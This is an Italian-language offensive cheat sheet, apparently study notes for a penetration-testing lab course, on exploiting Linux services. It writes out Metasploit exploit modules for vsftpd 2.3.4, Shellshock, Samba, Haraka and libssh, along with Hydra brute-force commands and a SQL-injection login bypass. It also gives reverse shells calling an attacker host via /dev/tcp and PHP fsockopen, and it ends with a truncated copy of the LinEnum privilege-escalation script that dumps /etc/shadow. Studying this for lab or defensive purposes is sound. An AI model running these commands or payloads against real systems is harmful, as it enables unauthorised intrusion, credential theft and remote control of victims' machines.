---
icon: ubuntu
---

# LINUX

## <mark style="color:$primary;">Exploit Linux</mark>

<table><thead><tr><th width="83">Port</th><th>Service</th><th>Funzione</th></tr></thead><tbody><tr><td>21</td><td>FTP</td><td>Usato per condividere file fra server e client</td></tr><tr><td>22</td><td>SSH</td><td>Usato per creare una shell da remoto</td></tr><tr><td>80</td><td>Apache Web Server</td><td>Web Server</td></tr><tr><td>443</td><td>Apache Web Server</td><td>Web Server</td></tr><tr><td>445</td><td>SAMBA</td><td>Condivisione di file.</td></tr></tbody></table>

***

### <mark style="color:$primary;">FTP exp - bruteForce</mark>

{% hint style="info" %}
\[PRIVILEGE] - Usato per condivisione di file fra server e client                                                            PORT 21

Accesso con credenziali (anche in anon)
{% endhint %}

{% hint style="info" %}
Forse è collegato ad una webpage.
{% endhint %}

Prima di tutto controlla se l'anonymous (senza dare cred) access è permesso&#x20;

```shellscript
use auxiliary/scanner/ftp/anonymous
    set RHOST <IP>
    run
ftp <IP>                            #Se abilitato l'anon hai accesso a FTP
    #Name: anonymous
    #Password: ENTER
#Se "login incorrect" non è attivo dunque continua
#Altrimenti
get <FILE>.txt                      #Se trovi file utili, prendili dalla vittima e portalo su attacker
exit
ls
```

{% tabs %}
{% tab title="ftp_login - msf" %}
Prima di tutto controlla se l'anonymous access è permesso

```shellscript
ftp <IP>
    #Name: anonymous
    #ENTER
#Se "login incorrect" non è attivo dunque continua
    #exit
```

trova user@psw con brute-force

```shellscript
use auxiliary/scanner/ftp/ftp_login                
    set RHOST <IP>
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    run
ftp <IP>                        #dopo psw potrai scaricare file tramite ftp 
    get <FILE>.txt              #Prendi il file da vittima e portalo su attacker
    exit
    ls
```

Login FTP

```shell
ftp <IP>
```
{% endtab %}

{% tab title="hydra" %}
Prima di tutto controlla se l'anonymous access è permesso

```shellscript
ftp <IP>
    #Name: anonymous
    #ENTER
#Se "login incorrect" non è attivo dunque continua
    #exit
```

Brute force per trovare le credenziali

```shellscript
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> -t 4 ftp
```

Login

```shellscript
ftp <IP>
    #Name: <USER_TROVATO>
    #Password: <PSW_TROVATA>
```

Controlla che funzioni con&#x20;

```shellscript
dir 
get <FILE>.txt
get <FILE2>.tar.gz
cat <FILE>.txt                                              #Se non lo trovi cerca sul ~    
cat xzf <FILE2>.tar.gz                                      #Estrai il file
    cat <EXTRACTED_FILE>.txt
```
{% endtab %}
{% endtabs %}

Prosegui con:

* FTP post-exploit

***

### <mark style="color:$primary;">FTP exp - vsftpd v2.3.4</mark>

{% hint style="warning" %}
\[ADMIN PRIVILEGES]

vsftpd v2.3.4 è vulnerabile a RCE. (solo Linux)   &#x20;
{% endhint %}

Prima di tutto controlla se l'anonymous (senza dare cred) access è permesso&#x20;

```shellscript
use auxiliary/scanner/ftp/anonymous
    set RHOST <IP>
    run
ftp <IP>                            #Se abilitato l'anon hai accesso a FTP
    #Name: anonymous
    #Password: ENTER
#Se "login incorrect" non è attivo dunque continua
#Altrimenti
get <FILE>.txt                      #Se trovi file utili, prendili dalla vittima e portalo su attacker
exit
ls
```

Se non è OK anonymous verifica se c'è la vuln

```shell
use exploit/unix/ftp/vsftpd_234_backdoor
    set RPORT <PORT>                                        #21
    run
```

Ora puoi aprire una shell

```shell
/bin/bash -i
    CTRL+Z y                                             #Metti in background
```

{% tabs %}
{% tab title="Fai upgrade a meterpreter" %}
Fai upgade a meterpreter session

```shellscript
#Hai shell cmd/unix

sessions -u <NUMBER>

#Ora hai una meterpreter x86/linux session
```
{% endtab %}

{% tab title="Usa msf per l'upgrade" %}
Apri un nuovo terminale

```shell
use post/multi/manage/shell_to_meterpreter    
    set LHOST eth1                                       #Forse coincide con IP_ATTACKER
    set SESSION <NUMBER_SESSSION_PRIMA>                  
    run
#Non importa se da errori
sessions
session <NUMBER_DI_meterpreter x86/linux>
    sysinfo
    getuid                                               #Se uid=0 allora sei root (non serve privesc)
```
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">HTTP + SMB exp - apri shell caricando su SMB</mark>

```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP_KALI> LPORT=1234 -f php > shell.php
```

Fai login su SMB

```shell
put shell.php
```

Vai su msf

```shell
use exploit/multi/handler
    set PAYLOAD php/meterpreter_reverse_tcp
    set LHOST <IP_KALI>         
    set LPORT <PORT>                #1234 (come shell)
    run
```

Ora vai su browser a:

```html
http://<IP>/<PATH>/shell.php                #PATH forse nulla o forse e.g. IPC$
```

Sul terminale KALI dovresti avere una shell meterpreter

***

### <mark style="color:$primary;">FTP exp - ProFTPD v1.3.5</mark>

```shell
use exploit/unix/ftp/proftpd_modcopy_exec
    set RHOSTS <IP>
    set RPORT <PORT>                                      #80
    set LHOST <IP KALI>
    set LPORT <PORT>                                      #4444
    #LEGGI SITEPATH DA APACHE2 DEFAULT BROWSER PAGE
    set SITEPATH <writable_folder>                        #/var/www/html
    set TARGETURI                                         #/
    run
```

***

### <mark style="color:$primary;">HTTP exp -Apache .cgi.sh</mark>

{% hint style="warning" %}
SHELLSHOCK (Permette di eseguire codice da bash)&#x20;

Necessario:

* script.cgi OPPURE script.sh
{% endhint %}

Apri il browser, fai "view page source" e cerca se ci sta uno script.cgi oppure script.sh.&#x20;

Check se è vulnerabile.

```shellscript
nmap -sV <IP> --script=http-shellshock --script-args "http-shellshock.uri=/<PATH_TO_SCRIPT.cgi_OR_.sh_IN_BROWSER>"     
#(e.g. /gettime.cgi) VULNERABLE 
```

Se vulnerabile:

{% tabs %}
{% tab title="AUTO - Crea shell & Trova hash psw (BEST)" %}
```shellscript
use exploit/multi/http/apache_mod_cgi_bash_env_exec
    setg RHOSTS <IP>
    setg RPORT <PORT> 
    set TARGETURI /<PATH_TO_SCRIPT_.cgi_OR_.sh>            #eg. /gettime.cgi
    set LHOST <IP_ATTACKER>                                #eg. /             
    run
```

Per controllare che la sessione funziona usa e poi usa liberamente la revshell creata:

```shellscript
sysinfo
whoami
uname -a
cat /etc/passwd                    #Leggi il file delle psw hashed
```
{% endtab %}

{% tab title="MANUALE - Crea shell" %}
1. Attiva Foxy Proxy su browser e select "Burp Suite"
2. Apri burp suite da GUI (temporary project, use burp defaults)
   1. Set "Proxy"
   2. Set "Intercept is on"
   3. Set "Forward"
3. Con il browser cerca `http://<IP>/<SCRIPT.cgi_NEL_BROWSER>`
4. Su burp, "Send to repeater" (tasto destro)

Ora scegli cosa vuoi fare nello specifico fra trovare le psw o generare una revshell

Mettiti in ascolto

{% code title="Kali" %}
```shellscript
nc -nvlp <LPORT>
```
{% endcode %}

Apri burp

{% code title="User Agent in BURP msg" %}
```shellscript
User Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<IP_ATTACKER>/<LPORT> 0>&1>'
```
{% endcode %}

* Set "Send"
* Ora su nc dovrebbe starci la shell e puoi provare comandi come i seguenti

```shellscript
cat /etc/*issue
whoami
uname -a
```
{% endtab %}

{% tab title="MANUALE - Trova hash psw" %}
1. Attiva Foxy Proxy su browser e select "Burp Suite"
2. Apri burp suite da GUI (temporary project, use burp defaults)
   1. Set "Proxy"
   2. Set "Intercept is on"
   3. Set "Forward"
3. Con il browser cerca `http://<IP>/<SCRIPT.cgi_NEL_BROWSER>`
4. Su burp, "Send to repeater" (tasto destro)

Ora scegli cosa vuoi fare nello specifico fra trovare le psw o generare una revshell

Su burp cambia user agent

```shellscript
User Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

Clicca "Send"

Nella risposta su burp ci sarà l'output
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">HTTP exp - Writab folder</mark>

```shell
#Modifica la reverse shell di php
vim /usr/share/webshells/php/php-reverse-shell.php
    #Modifica IP:KALI e PORT

#New terminal
nc -nvlp <PORT>

smbclient //<IP>/<WRITABLE_FOLDER> -N -c "put /usr/share/webshells/php/php-reverse-shell.php php-reverse-shell.php"
```

***

### <mark style="color:$primary;">HTTP exp - bruteForce</mark>

Trova user@psw con brute-force

```shellscript
use auxiliary/scanner/http/http_login
    set AUTH_URI /<DIR_CON_AUTHENTICATION>/
    set RHOSTS <TARGET_IP>
    set RPORT <PORTA_TARGET>                             #di solito 80
    unset USERPASS_FILE
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt          #opzionale. Inoltre puoi anche specificare uno specifico user
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt    #opzionale.
    run
```

Verificare se il server web accetta upload tramite HTTP `PUT` (se si, carica shell o altri file).

```shellscript
use auxiliary/scanner/http/http_put
    set RHOSTS <TARGET_IP>
    run
    
#se hai trovato dir che accettano PUT usa anche
    set TARGETURI /<DIR_CHE_ACCETTA_PUT>
    set FILE /<SHELL/FILE_DA_CARICARE>
```

***

### <mark style="color:$primary;">HTTP exp - loginForm brutef</mark>

```shell
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"

```

O usa bug dei fields

```
# username field
    admin' --
# password field
    bho
```

***

### <mark style="color:$primary;">MySQL exp - bruteForce</mark>

{% code title="Setup workspace in metasploit" %}
```shellscript
workspace -a mysql                                   #se già esiste cmd senza -a
workspace
search type:<TIPO_DI_MODULO> name:<PROTOCOL>         #e.g. type:auxiliary name:mysql
```
{% endcode %}

Trova user@psw (brute-force)

```shellscript
use auxiliary/scanner/mysql/mysql_login
    set RHOSTS <TARGET_IP>
    set RPORT <PORTA_TARGET>                                 #di solito 3306
    unset USEPASS_FILE
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    #OPPURE
    set USERNAME <USER_DA_BUCARE>                            #se buchi root = bingo
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt    #opzionale.
    run
creds                                                        #per leggere tutte le credentials trovate      
```

{% tabs %}
{% tab title="Trova pswHashes" %}
Trova gli hash delle psw

```shellscript
 use auxiliary/scanner/mysql/mysql_hashdump
    set PASSWORD <ROOT_PSW_FOUND>
    set USERNAME <USERNAME_USATO_DA_ROOT>                   #spesso root
    run
```

oppure&#x20;

Trova info da un db come HASH PSW e PRIVILEGI

<pre class="language-shellscript"><code class="lang-shellscript"><strong>use auxiliary/admin/mysql/mysql_enum                        #per usarla devi sapere admin@psw essendo admin
</strong>    set RHOSTS &#x3C;IP>
    set USERNAME &#x3C;USERNAME_USATO_DA_ROOT>                   #spesso root
    set PASSWORD &#x3C;ROOT_PSW_FOUND>
    run
</code></pre>
{% endtab %}

{% tab title="Esegui SQL query" %}
Esegui una query SQL.

Qui leggi tutti i DB.

```shellscript
#Se sei root puoi leggere
use auxiliary/admin/mysql/mysql_sql
    set USERNAME <USERNAME_USATO_DA_ROOT>                   #spesso root
    set PASSWORD <ROOT_PSW_FOUND>
    set SQL show databases;                                 #leggi tutti i db  
    run
```
{% endtab %}

{% tab title="Leggi tutti i DB" %}
Leggi tutti i DB

```shellscript
use auxiliary/scanner/mysql/mysql_schemadump
    set PASSWORD <ROOT_PSW_FOUND>
    set USERNAME <USERNAME_USATO_DA_ROOT>                   #spesso root
    run 
creds                                                       #leggi le creds trovate
```
{% endtab %}

{% tab title="File accessibili da MySQL" %}
Trova tutti i file accessibili da MySQL

```shellscript
 use auxiliary/scanner/mysql/mysql_file_enum
    set PASSWORD <ROOT_PSW_FOUND>
    set USERNAME <USERNAME_USATO_DA_ROOT>                   #spesso root
    set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
    set VERBOSE true
    run
```
{% endtab %}

{% tab title="Dir writable da MySQL" %}
Trova le directory scrivibili da MySQL

```shellscript
 use auxiliary/scanner/mysql/mysql_writable_dirs
    set PASSWORD <ROOT_PSW_FOUND>
    set USERNAME <USERNAME_USATO_DA_ROOT>                   #spesso root
    set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
    run
```
{% endtab %}
{% endtabs %}

Login&#x20;

{% tabs %}
{% tab title="Remote host" %}
```shellscript
mysql -h <TARGET_IP> -u <USER> -p
```
{% endtab %}

{% tab title="Local host" %}
```shellscript
mysql <TARGET_IP> -u <USER> -p
```
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">SSHv2 exp -libssh 0.6-0.8</mark>

{% hint style="warning" %}
\[ADMIN PRIVILEGES]

SSHv2 libssh v0.6.0-0.8.0 è vulnerabile a RCE. (solo Linux)                                                                PORT 22
{% endhint %}

```shell
use auxiliary/scanner/ssh/libssh_auth_bypass
    set SPAWN_PTY true
    run
sessions                                                #Dovrebbe esserci una sessione shell
sessions <NUMBER>
```

Ora puoi usare la shell

```shell
whoami                                                  #Se è root bingo
CTRL+Z y                                                #Metti in background
```

{% tabs %}
{% tab title="Fai upgrade a meterpreter" %}
Fai upgrade a meterpreter session

```shellscript
#Hai shell cmd/unix

sessions -u <NUMBER>

#Ora hai una meterpreter x86/linux session
```
{% endtab %}

{% tab title="Usa msf per l'upgrade" %}
Apri un nuovo terminale

```shell
use post/multi/manage/shell_to_meterpreter    
    set LHOST eth1                                       #Forse coincide con IP_ATTACKER
    set SESSION <NUMBER_SESSSION_PRIMA>                  
    run
#Non importa se da errori
sessions
session <NUMBER_DI_meterpreter x86/linux>
    sysinfo
    getuid                                               #Se uid=0 allora sei root (non serve privesc)
```
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">SSH exp - bruteForce</mark>

{% hint style="info" %}
SSH può fare auth in:

* user@psw (usa brute-force)
* auth con key
{% endhint %}

{% tabs %}
{% tab title="ssh_login - msf" %}
Trova user@psw con brute-force                                        //c'è anche per PUBLIC\_KEY

```shellscript
use auxiliary/scanner/ssh/ssh_login
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt          #opzionale. Inoltre puoi anche specificare uno specifico user
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt      #oppure unix_passwords.tx
    run
#Se ok e crea session per aprirla
sessions
sessions <NUMBER>
/bin/bash -i
    ls
    whoami 
    exit
CTRL+C y
```

Login

```shellscript
ssh <USER>@<IP>
```
{% endtab %}

{% tab title="hydra" %}
Brute force per trovare le credenziali

```shellscript
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> -t 4 ssh
```

Login

```shellscript
ssh <USER>@<IP>
```

Controlla che funzioni con

```shellscript
whoami
groups sysadmin
cat /etc/*issue                                        #Trova OS version
uname -r                                               #Trova kernel version
cat /etc/passwd                                        #Trova users nel system
ls                                                     #Cerca se ci sono file interessanti
```
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">SAMBA exp - bruteForce</mark>

{% hint style="info" %}
\[USER TROVATO PRIVILEGE] Usato per condivisione di file                                                       PORT 139/445

2 TIPI DI AUTH:&#x20;

* User auth (user@psw x accesso uno share)
* <mark style="color:$danger;">Share auth (psw x accesso a restricted share)</mark>

REC - Accesso con credenziali e poi carica revshell
{% endhint %}

Authentication anon

```shellscript
smbclient \\\\<IP>\\pubvault
smbclient \\\\<IP>\\pubfiles
smbclient \\\\<IP>\\public
smbclient \\\\<IP>\\share
#ECC... a mano prova anche altre public shares
```

Brute force per trovare le credenziali

{% tabs %}
{% tab title="Brute-force - msf" %}
```shellscript
use auxiliary/scanner/smb/smb_login
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    run
#OUTPUT SUCCESS
#[+] 192.15.186.3:139      - 192.15.186.3:139 - Success: '.\rooty:admin'
#User:rooty Psw:admin
#smbclient \\\\<IP>\\rooty -U rooty 
smbclient \\\\<IP>\\<USER> -U <USER> 
```

Se trovi altri account e.g. con smb\_enumusers aggiungili alla lista degli user e rilancia

```shellscript
use auxiliary/scanner/smb/smb_enumusers
    set RHOSTS 
    run
#Crea nuovo file con user trovati
vim usersmblogin.txt
use auxiliary/scanner/smb/smb_login
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    set USER_FILE /PATH/TO/NEW/USERS/FILE.txt
    run
```
{% endtab %}

{% tab title="All users" %}
```shellscript
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> -t 4 smb
```
{% endtab %}

{% tab title="Specifico user" %}
Trova psw di admin (o altro user)

```shellscript
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> smb
```
{% endtab %}
{% endtabs %}

Enumera tutte le sharenames e guarda i permessi associati

{% tabs %}
{% tab title="smbclient (BEST)" %}
Trova le share

```shellscript
smbmap -H <IP> -u <USER> -p <PSW>
```

Login a share specifica

```shellscript
smbclient \\\\<IP>\\<SHARE> -U <USER>                #SHARE a volte è USER 
```
{% endtab %}

{% tab title="enum4linux" %}
```shellscript
enum4linux -a -u <USER> -p <PSW>
```

Ti dirà: OS info, Users, Sharename, Psw policies, SID per users
{% endtab %}
{% endtabs %}

Naviga con dir e cd nelle varie cartelle cercando file utili. Se non trovi prova con altri sharename.&#x20;

Se trovi o leggi o fai il download del file con il cmd sotto e ti troverai il file sul \~ di Kali.

```shellscript
get <FILE>.txt
get <FILE2>.tar.gz
cat <FILE>.txt                                              #Se non lo trovi cerca sul ~    
cat xzf <FILE2>.tar.gz                                      #Estrai il file
    cat <EXTRACTED_FILE>.txt
```

***

### <mark style="color:$primary;">SAMBA exp - 3.x-4.x</mark>

{% hint style="warning" %}
\[ADMIN PRIVILEGE]

SAMBA v3.5.0, v4.4.14, v4.5.10 e v4.6.4 è vulnerabile a RCE. (solo Linux)                                PORT 139/445

Se enum da versione smbd 3.X - 4.X fai check
{% endhint %}

```shell
use exploit/linux/samba/is_known_pipename
    check                                                         #The target appears to be vulnerable.
    run
    /bin/bash -i
    CTRL+Z y
```

{% tabs %}
{% tab title="Fai upgrade a meterpreter" %}
Fai upgade a meterpreter session

```shellscript
#Hai shell cmd/unix

sessions -u <NUMBER>

#Ora hai una meterpreter x86/linux session
```
{% endtab %}

{% tab title="Usa msf per l'upgrade" %}
Apri un nuovo terminale

```shell
use post/multi/manage/shell_to_meterpreter    
    set LHOST eth1                                       #Forse coincide con IP_ATTACKER
    set SESSION <NUMBER_SESSSION_PRIMA>                  
    run
#Non importa se da errori
sessions
session <NUMBER_DI_meterpreter x86/linux>
    sysinfo
    getuid                                               #Se uid=0 allora sei root (non serve privesc)
```
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">SMTP exp - haraka 2.8.9</mark>

{% hint style="warning" %}
\[ADMIN PRIVILEGE]

SMTP haraka v<=28.9 è vulnerabile a CMD injection. (solo Linux)                                      PORT 25/465/587
{% endhint %}

```shell
use exploit/linux/smtp/haraka
    set SRVHOST <>
    set SRVPORT <PORT>                                            #9898
    set email_to root@attackdefense.test
    set payload linux/x64/meterpreter_reverse_http
    set LHOST eth1
    set LPORT <PORT>                                              #8080
    run
```

Apri la session che hai creato

```shell
sessions <NUMBER>
```

{% code title="meterpreter" %}
```shell
sysinfo
getuid                                                            #Se uid=0 allora sei root (non serve privesc)
```
{% endcode %}

***

### &#x20;<mark style="color:$primary;">PHP exp - vuln</mark>

Prova a leggere da browser:

```http
http://<IP>/phpinfo.php
```

Se trovi vuln relativa a php su versione specifica potrebbe essere necessario eseguirlo.

```shell
python2 <EXPLOIT_ID>.py
```

Oppure modifica il contenuto del php.

```shell
vim <EXPLOIT_ID>.py
#Modifica il parametro pwn_code come segue in modo da connetterti al listener
pwn_code = """<?php $sock=fsockopen("<IP_ATTACKER>",1234);exec("/bin/sh -i <&4 >&4 2>&4");?>"""
:wq
```

Avvia un listener e lancia il php modificato

```shell
nc -nvlp 1234    
```

Su altro terminale

```shell
python2 <EXPLOIT_ID>.py <IP> 80
    /bin/bash -i
    #Dovresti avere una shell di www-data senza privilegi
    ls -al
    uname -r 
    cat /etc/*release
```

***

***

## <mark style="color:$primary;">——— POST EXPLOIT</mark>

### <mark style="color:$primary;">Servizi network locali</mark>

```shell
netstat -ano
nc 127.0.0.1 <PORT>
```

***

## <mark style="color:$primary;">1 - Local Enum</mark>

Trova più informazioni sul sistema appena exploitato come:

1. <mark style="color:orange;">Info sul sistema</mark> (hostname, distribution e release version, kernel version e architecture, CPU info, disk info e mounted drives e packages/software installati).                                                                         Da meterpreter:                                                                        se non hai meterpreter fai upgrade della shell
   1. getuid, sysinfo
   2. shell
      1. /bin/bash -i
         1. hostname
         2. cat /etc/issue&#x20;
         3. cat /etc/\*release
         4. uname -a
         5. lscpu &#x20;
2. <mark style="color:orange;">Users e groups</mark> (current user & privileges, altri users nel sistema, groups).                                                                                                                                     Da meterpreter:                                                                        se non hai meterpreter fai upgrade
   1. getuid                                                                                                                               uid=0 è root
   2. shell
      1. /bin/bash -i
         1. whoami
         2. cat /etc/passwd                                        user -> /bin/bash, service -> /usr/sbin/nologin
         3. cat /etc/passwd | grep -v /nologin                                                           user -> /bin/bash
         4. ls -al /home
         5. groups \<USER>
         6. groups
         7. lastlog
3. <mark style="color:orange;">Network Info</mark> (victim IP e network adapter, internal networks, servizi TCP/UDP, altri hosts nel network).                                                                                                                                                 Da meterpreter:                                                                        se non hai meterpreter fai upgrade
   1. ifconfig
   2. netstat
   3. route
   4. shell
      1. /bin/bash -i
         1. ifconfig
         2. ip a s
         3. cat /etc/networks
         4. cat /etc/hostname
         5. cat /etc/hosts
         6. cat /etc/resolv.conf                                               nameserver usato per default
4. <mark style="color:orange;">Processi e cronjobs</mark> (servizi i running e cronjobs).                                                                              Da meterpreter:                                                                        se non hai meterpreter fai upgrade
   1. ps
   2. pgrep \<PROCESS>
   3. shell
      1. /bin/bash -i
         1. ps
         2. ps aux
         3. ps aux | grep root                                                  leggi tutti i processi runnati da root
         4. crontab -l                                                               cerca cronjobs di root
         5. ls -al /etc/cron\*                                                     leggi tutti i cronjobs
         6. cat /etc/cron\*
5. <mark style="color:orange;">Automating Windows Local Enum</mark>                                                                                                                       Da meterpreter:
   1. use post/linux/gather/enum\_configs                              trova tutti i config files
   2. use post/linux/gather/enum\_network                            trova tutte le info sul network
   3. use post/linux/gather/enum\_checkvm                           trova se sei in una vm

***

### <mark style="color:$primary;">Enum</mark>

```shell
use post/linux/gather/enum_configs

use post/linux/gather/enum_network

use post/linux/gather/enum_system
```

***

### <mark style="color:$primary;">LinEnum</mark>

<details>

<summary>Copia il codice sotto in un file su attacker in <code>root/Desktop/LinEnum.sh</code></summary>

```
#!/bin/bash
#A script to enumerate local information from a Linux host
version="version 0.982"
#@rebootuser

#help function
usage () 
{ 
echo -e "\n\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;31m#\e[00m" "\e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m" "\e[00;31m#\e[00m"
echo -e "\e[00;31m#########################################################\e[00m"
echo -e "\e[00;33m# www.rebootuser.com | @rebootuser \e[00m"
echo -e "\e[00;33m# $version\e[00m\n"
echo -e "\e[00;33m# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t \e[00m\n"

		echo "OPTIONS:"
		echo "-k	Enter keyword"
		echo "-e	Enter export location"
		echo "-s 	Supply user password for sudo checks (INSECURE)"
		echo "-t	Include thorough (lengthy) tests"
		echo "-r	Enter report name" 
		echo "-h	Displays this help text"
		echo -e "\n"
		echo "Running with no options = limited scans/no output file"
		
echo -e "\e[00;31m#########################################################\e[00m"		
}
header()
{
echo -e "\n\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;31m#\e[00m" "\e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m" "\e[00;31m#\e[00m" 
echo -e "\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;33m# www.rebootuser.com\e[00m" 
echo -e "\e[00;33m# $version\e[00m\n" 

}

debug_info()
{
echo "[-] Debug Info" 

if [ "$keyword" ]; then 
	echo "[+] Searching for the keyword $keyword in conf, php, ini and log files" 
fi

if [ "$report" ]; then 
	echo "[+] Report name = $report" 
fi

if [ "$export" ]; then 
	echo "[+] Export location = $export" 
fi

if [ "$thorough" ]; then 
	echo "[+] Thorough tests = Enabled" 
else 
	echo -e "\e[00;33m[+] Thorough tests = Disabled\e[00m" 
fi

sleep 2

if [ "$export" ]; then
  mkdir $export 2>/dev/null
  format=$export/LinEnum-export-`date +"%d-%m-%y"`
  mkdir $format 2>/dev/null
fi

if [ "$sudopass" ]; then 
  echo -e "\e[00;35m[+] Please enter password - INSECURE - really only for CTF use!\e[00m"
  read -s userpassword
  echo 
fi

who=`whoami` 2>/dev/null 
echo -e "\n" 

echo -e "\e[00;33mScan started at:"; date 
echo -e "\e[00m\n" 
}

# useful binaries (thanks to https://gtfobins.github.io/)
binarylist='aria2c\|arp\|ash\|awk\|base64\|bash\|busybox\|cat\|chmod\|chown\|cp\|csh\|curl\|cut\|dash\|date\|dd\|diff\|dmsetup\|docker\|ed\|emacs\|env\|expand\|expect\|file\|find\|flock\|fmt\|fold\|ftp\|gawk\|gdb\|gimp\|git\|grep\|head\|ht\|iftop\|ionice\|ip$\|irb\|jjs\|jq\|jrunscript\|ksh\|ld.so\|ldconfig\|less\|logsave\|lua\|make\|man\|mawk\|more\|mv\|mysql\|nano\|nawk\|nc\|netcat\|nice\|nl\|nmap\|node\|od\|openssl\|perl\|pg\|php\|pic\|pico\|python\|readelf\|rlwrap\|rpm\|rpmquery\|rsync\|ruby\|run-parts\|rvim\|scp\|script\|sed\|setarch\|sftp\|sh\|shuf\|socat\|sort\|sqlite3\|ssh$\|start-stop-daemon\|stdbuf\|strace\|systemctl\|tail\|tar\|taskset\|tclsh\|tee\|telnet\|tftp\|time\|timeout\|ul\|unexpand\|uniq\|unshare\|vi\|vim\|watch\|wget\|wish\|xargs\|xxd\|zip\|zsh'

system_info()
{
echo -e "\e[00;33m### SYSTEM ##############################################\e[00m" 

#basic kernel info
unameinfo=`uname -a 2>/dev/null`
if [ "$unameinfo" ]; then
  echo -e "\e[00;31m[-] Kernel information:\e[00m\n$unameinfo" 
  echo -e "\n" 
fi

procver=`cat /proc/version 2>/dev/null`
if [ "$procver" ]; then
  echo -e "\e[00;31m[-] Kernel information (continued):\e[00m\n$procver" 
  echo -e "\n" 
fi

#search all *-release files for version info
release=`cat /etc/*-release 2>/dev/null`
if [ "$release" ]; then
  echo -e "\e[00;31m[-] Specific release information:\e[00m\n$release" 
  echo -e "\n" 
fi

#target hostname info
hostnamed=`hostname 2>/dev/null`
if [ "$hostnamed" ]; then
  echo -e "\e[00;31m[-] Hostname:\e[00m\n$hostnamed" 
  echo -e "\n" 
fi
}

user_info()
{
echo -e "\e[00;33m### USER/GROUP ##########################################\e[00m" 

#current user details
currusr=`id 2>/dev/null`
if [ "$currusr" ]; then
  echo -e "\e[00;31m[-] Current user/group info:\e[00m\n$currusr" 
  echo -e "\n"
fi

#last logged on user information
lastlogedonusrs=`lastlog 2>/dev/null |grep -v "Never" 2>/dev/null`
if [ "$lastlogedonusrs" ]; then
  echo -e "\e[00;31m[-] Users that have previously logged onto the system:\e[00m\n$lastlogedonusrs" 
  echo -e "\n" 
fi

#who else is logged on
loggedonusrs=`w 2>/dev/null`
if [ "$loggedonusrs" ]; then
  echo -e "\e[00;31m[-] Who else is logged on:\e[00m\n$loggedonusrs" 
  echo -e "\n"
fi

#lists all id's and respective group(s)
grpinfo=`for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null`
if [ "$grpinfo" ]; then
  echo -e "\e[00;31m[-] Group memberships:\e[00m\n$grpinfo"
  echo -e "\n"
fi

#added by phackt - look for adm group (thanks patrick)
adm_users=$(echo -e "$grpinfo" | grep "(adm)")
if [[ ! -z $adm_users ]];
  then
    echo -e "\e[00;31m[-] It looks like we have some admin users:\e[00m\n$adm_users"
    echo -e "\n"
fi

#checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)
hashesinpasswd=`grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null`
if [ "$hashesinpasswd" ]; then
  echo -e "\e[00;33m[+] It looks like we have password hashes in /etc/passwd!\e[00m\n$hashesinpasswd" 
  echo -e "\n"
fi

#contents of /etc/passwd
readpasswd=`cat /etc/passwd 2>/dev/null`
if [ "$readpasswd" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/passwd:\e[00m\n$readpasswd" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/passwd $format/etc-export/passwd 2>/dev/null
fi

#checks to see if the shadow file can be read
readshadow=`cat /etc/shadow 2>/dev/null`
if [ "$readshadow" ]; then
  echo -e "\e[00;33m[+] We can read the shadow file!\e[00m\n$readshadow" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readshadow" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/shadow $format/etc-export/shadow 2>/dev/null
fi

#checks to see if /etc/master.passwd can be read - BSD 'shadow' variant
readmasterpasswd=`cat /etc/master.passwd 2>/dev/null`
if [ "$readmasterpasswd" ]; then
  echo -e "\e[00;33m[+] We can read the master.passwd file!\e[00m\n$readmasterpasswd" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readmasterpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/master.passwd $format/etc-export/master.passwd 2>/dev/null
fi

#all root accounts (uid 0)
